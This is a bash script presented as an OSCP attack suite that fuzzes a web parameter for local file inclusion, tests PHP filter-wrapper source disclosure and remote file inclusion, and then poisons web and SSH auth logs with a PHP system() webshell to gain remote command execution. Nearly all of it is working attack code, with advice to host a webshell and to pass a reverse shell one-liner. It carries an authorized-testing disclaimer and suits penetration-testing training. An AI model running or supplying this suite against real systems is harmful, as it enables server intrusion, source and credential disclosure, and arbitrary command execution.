#!/bin/bash

# ==============================================================================
# Advanced OSCP LFI, RFI, Wrapper & Log Poisoning Suite
# Wordlist: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
#
# For use only against systems you are explicitly authorized to test
# (OSCP labs, the exam, your own machines, engagements with written scope).
# ==============================================================================

WORDLIST="/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"

# Defaults for the log-poisoning module (override with flags, see usage)
CMD="id"                 # command executed on the target once a log is poisoned
CMD_PARAM="cmd"          # GET parameter your PHP payload reads the command from
SSH_HOST=""              # host:port for auth.log poisoning via SSH username
MARKER="LFIPWN_$RANDOM"  # unique string to confirm our payload actually ran

# Help Function
usage() {
    echo "=============================================================================="
    echo " OSCP Advanced LFI, RFI, Wrapper & Log Poisoning Suite"
    echo "=============================================================================="
    echo " Usage: $0 <URL_with_FUZZ> [options]"
    echo ""
    echo " Arguments:"
    echo "   URL_with_FUZZ   The vulnerable URL containing 'FUZZ' where the payload goes."
    echo ""
    echo " Options:"
    echo "   -c, --cmd CMD        Command to run on target via log poisoning (default: id)"
    echo "   -p, --param NAME     GET param the PHP payload reads cmd from (default: cmd)"
    echo "   -s, --ssh HOST:PORT  Also try auth.log poisoning via SSH username injection"
    echo "   -h, --help           Display this help message and exit"
    echo ""
    echo " Examples:"
    echo "   $0 'http://10.10.10.X/vulnerable.php?page=FUZZ'"
    echo "   $0 'http://10.10.10.X/vulnerable.php?page=FUZZ' -c 'uname -a'"
    echo "   $0 'http://10.10.10.X/vulnerable.php?page=FUZZ' -s 10.10.10.X:22"
    echo "=============================================================================="
    exit 0
}

# Check for -h or --help flags, or missing arguments
if [[ "$#" -eq 0 || "$1" == "-h" || "$1" == "--help" ]]; then
    usage
fi

URL="$1"
shift

# Parse optional flags
while [[ "$#" -gt 0 ]]; do
    case "$1" in
        -c|--cmd)   CMD="$2"; shift 2 ;;
        -p|--param) CMD_PARAM="$2"; shift 2 ;;
        -s|--ssh)   SSH_HOST="$2"; shift 2 ;;
        -h|--help)  usage ;;
        *) echo "[-] Unknown option: $1"; usage ;;
    esac
done

# Helper: build a full target URL by substituting FUZZ (or appending)
build_target() {
    local payload="$1"
    if [[ "$URL" == *"FUZZ"* ]]; then
        echo "${URL//FUZZ/$payload}"
    else
        echo "${URL}${payload}"
    fi
}

# Check if Seclists wordlist exists
if [ ! -f "$WORDLIST" ]; then
    echo "[-] Wordlist not found at $WORDLIST. Verify your SecLists installation."
    exit 1
fi

echo "[+] Starting LFI and Vulnerability Suite on: $URL"
echo "=================================================="

# ------------------------------------------------------------------------------
# 1. Standard LFI Fuzzing Loop (/etc/passwd)
# ------------------------------------------------------------------------------
echo "[+] Phase 1: Fuzzing for Local File Inclusion (LFI)..."
LFI_PREFIX=""   # remember a working traversal prefix for the log-poisoning phase
while IFS= read -r payload; do
    [[ -z "$payload" || "$payload" =~ ^# ]] && continue

    target="$(build_target "$payload")"
    response=$(curl -s -L "$target")

    if echo "$response" | grep -q "root:x:0:0:"; then
        echo "[!] SUCCESS: LFI Detected!"
        echo "    -> Payload: $payload"
        echo "    -> Target URL: $target"
        echo "--------------------------------------------------"

        # Derive the traversal prefix used to reach /etc/passwd so we can
        # reuse it to reach log files in Phase 4 (e.g. "../../../../").
        if [[ "$payload" == *"etc/passwd"* ]]; then
            LFI_PREFIX="${payload%%etc/passwd*}"
        fi
    fi
done < "$WORDLIST"

echo "[+] Phase 1 Complete."
echo "=================================================="

# ------------------------------------------------------------------------------
# 2. PHP Wrapper Testing (php://filter source code disclosure)
# ------------------------------------------------------------------------------
echo "[+] Phase 2: Testing PHP Wrappers (php://filter)..."

WRAPPER_FILES=("index.php" "config.php" "login.php" "db.php")

for file in "${WRAPPER_FILES[@]}"; do
    wrapper_payload="php://filter/convert.base64-encode/resource=$file"
    w_target="$(build_target "$wrapper_payload")"
    w_resp=$(curl -s -L "$w_target")

    if [[ ${#w_resp} -gt 50 ]] && [[ "$w_resp" =~ ^[a-zA-Z0-9+/=]+$ ]]; then
        echo "[!] SUCCESS: Wrapper Source Code Disclosure Found!"
        echo "    -> File Target: $file"
        echo "    -> Target URL: $w_target"
        echo "    -> Base64 Output Snippet: ${w_resp:0:60}..."
        echo "    -> Decode with: echo '<base64>' | base64 -d"
        echo "--------------------------------------------------"
    fi
done

echo "[+] Phase 2 Complete."
echo "=================================================="

# ------------------------------------------------------------------------------
# 3. Remote File Inclusion (RFI) Testing (External URL fetch check)
# ------------------------------------------------------------------------------
echo "[+] Phase 3: Testing Remote File Inclusion (RFI)..."

RFI_TEST_URL="https://www.google.com"
rfi_target="$(build_target "$RFI_TEST_URL")"

echo "[*] Testing if target fetches external content from: $RFI_TEST_URL"
rfi_resp=$(curl -s -L "$rfi_target")

if echo "$rfi_resp" | grep -q -E "Google|<html|<!DOCTYPE html>"; then
    echo "[!] CRITICAL SUCCESS: RFI / External URL Inclusion Detected!"
    echo "    -> Target URL: $rfi_target"
    echo "    -> Action: The application fetched an external webpage. Host your own"
    echo "       webshell on your machine and pass it to the parameter!"
    echo "--------------------------------------------------"
else
    echo "[-] RFI check failed (allow_url_include / allow_url_fopen is likely Off)."
fi

echo "[+] Phase 3 Complete."
echo "=================================================="

# ------------------------------------------------------------------------------
# 4. Log Poisoning (LFI -> RCE)
#    Step A: find a log file readable through the LFI
#    Step B: inject a PHP command payload into it (User-Agent / SSH username)
#    Step C: include the poisoned log via LFI and run $CMD to confirm RCE
# ------------------------------------------------------------------------------
echo "[+] Phase 4: Log Poisoning (LFI -> RCE)..."
echo "[*] Command to execute on success: $CMD   (param: $CMD_PARAM, marker: $MARKER)"

LOG_PATHS=(
    "/var/log/apache2/access.log"
    "/var/log/apache/access.log"
    "/var/log/httpd/access_log"
    "/var/log/apache2/error.log"
    "/var/log/nginx/access.log"
    "/var/log/nginx/error.log"
    "/var/log/auth.log"
    "/var/log/secure"
    "/var/log/vsftpd.log"
    "/var/log/mail.log"
)

# The PHP payload we drop into the log. system() reads the command from a GET
# parameter so you can change the command per-request without re-poisoning.
PHP_PAYLOAD="<?php echo '$MARKER'; system(\$_GET['$CMD_PARAM']); ?>"

# Base URL (strip query string) used to reach a page that writes to access logs.
WEB_ROOT="${URL%%\?*}"

poisoned_any=0

for log in "${LOG_PATHS[@]}"; do
    # Reach the log either through a confirmed traversal prefix or via FUZZ.
    if [[ -n "$LFI_PREFIX" ]]; then
        log_payload="${LFI_PREFIX}${log#/}"
    else
        log_payload="$log"
    fi
    log_target="$(build_target "$log_payload")"

    # --- Step A: is the log readable through the LFI? -------------------------
    log_resp=$(curl -s -L "$log_target")
    if ! echo "$log_resp" | grep -q -E "HTTP/1\.[01]|invalid user|pam_unix|Mozilla|sshd\[|GET /"; then
        continue
    fi

    echo "[!] READABLE LOG FOUND: $log"
    echo "    -> Target URL: $log_target"

    # --- Step B: inject the payload -------------------------------------------
    case "$log" in
        *auth.log|*secure)
            # auth.log / secure: the SSH username is logged on a failed login.
            if [[ -n "$SSH_HOST" ]]; then
                ssh_target="${SSH_HOST%%:*}"
                ssh_port="${SSH_HOST##*:}"; [[ "$ssh_port" == "$SSH_HOST" ]] && ssh_port=22
                echo "    -> Poisoning via SSH username injection to $ssh_target:$ssh_port ..."
                ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p "$ssh_port" \
                    "$PHP_PAYLOAD"@"$ssh_target" 2>/dev/null
            else
                echo "    -> Skipping auth.log: provide -s HOST:PORT to inject via SSH username."
                continue
            fi
            ;;
        *)
            # access/error logs: User-Agent is logged on every request.
            echo "    -> Poisoning via User-Agent header ..."
            curl -s -L -A "$PHP_PAYLOAD" "$WEB_ROOT" >/dev/null
            ;;
    esac

    # --- Step C: include the poisoned log and run the command -----------------
    if [[ "$log_target" == *"?"* ]]; then
        exec_url="${log_target}&${CMD_PARAM}=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$CMD" 2>/dev/null || echo "$CMD")"
    else
        exec_url="${log_target}?${CMD_PARAM}=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$CMD" 2>/dev/null || echo "$CMD")"
    fi

    exec_resp=$(curl -s -L "$exec_url")

    if echo "$exec_resp" | grep -q "$MARKER"; then
        echo "[!!] RCE CONFIRMED via Log Poisoning!"
        echo "    -> Poisoned log: $log"
        echo "    -> Exec URL: $exec_url"
        echo "    -> Command output:"
        echo "$exec_resp" | sed "s/.*$MARKER//" | sed 's/^/        /'
        echo "    -> Run other commands by changing the '$CMD_PARAM' value, e.g.:"
        echo "       curl -s -L '${exec_url%%$CMD_PARAM=*}${CMD_PARAM}=whoami'"
        echo "       For a shell, set -c to a reverse shell one-liner."
        poisoned_any=1
    else
        echo "    -> Payload injected but marker not reflected (log may not execute PHP,"
        echo "       or output is sanitized). Try a different log or wrapper."
    fi
    echo "--------------------------------------------------"
done

if [[ "$poisoned_any" -eq 0 ]]; then
    echo "[-] No log poisoning RCE confirmed."
fi

echo "[+] Phase 4 Complete."
echo "=================================================="
echo "[+] Scan finished completely. Good luck"
